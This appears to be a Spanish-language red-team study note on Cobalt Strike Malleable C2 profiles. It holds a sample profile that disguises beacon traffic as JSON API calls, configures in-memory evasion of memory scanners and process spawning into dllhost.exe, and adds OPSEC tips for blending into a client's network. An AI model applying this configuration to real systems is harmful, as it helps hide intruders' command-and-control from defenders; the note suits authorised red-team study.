---
tags: [c2, cobalt-strike, malleable, profile, opsec]
status: wip
---

# Malleable C2 Profile

> Configuración del perfil que define cómo se comporta y parece el tráfico del beacon.

---

## Estructura del Perfil

```
# malleable.profile

# Configuración global
set sleeptime "60000";          # Callback cada 60s
set jitter "20";                # ±20% variación
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...";

# Bloque HTTP-GET (beacon → team server)
http-get {
    set uri "/api/v1/health";
    client {
        header "Accept" "application/json";
        # Datos del beacon en cookie o parámetro
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            print;
        }
    }
}

# Bloque HTTP-POST (team server → beacon, comandos)
http-post {
    set uri "/api/v1/update";
    client {
        header "Content-Type" "application/json";
        id { ... }
        output { ... }
    }
    server {
        header "Content-Type" "application/json";
        output { ... }
    }
}

# Configuración del beacon en memoria
stage {
    set userwx "false";
    set startrwx "false";
    set stomppe "true";
    set obfuscate "true";
    set sleep_mask "true";
    set module_x64 "xpsservices.dll";
    
    transform-x64 {
        strrep "ReflectiveLoader" "";
    }
}

# Configuración post-explotación
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
}

# Named pipe para SMB beacons
set pipename "wkssvc";
```

---

## Validar Perfil

```bash
# Antes de cargar en CS, validar el perfil
./c2lint malleable.profile
```

---

## Perfiles de Referencia

- [Malleable-C2-Profiles en GitHub](https://github.com/BC-SECURITY/Malleable-C2-Profiles)
- [CS Manual — Malleable C2](https://www.cobaltstrike.com/help-malleable-c2)

---

## OPSEC Tips

> - El `useragent` debe coincidir con agentes reales del entorno (capturar tráfico primero)
> - Los URIs deben parecer tráfico legítimo de la industria del cliente
> - El `stage` block es donde más diferencia hace en evasión de memory scanners
> - `sleep_mask "true"` + `module_x64` son las dos opciones más impactantes

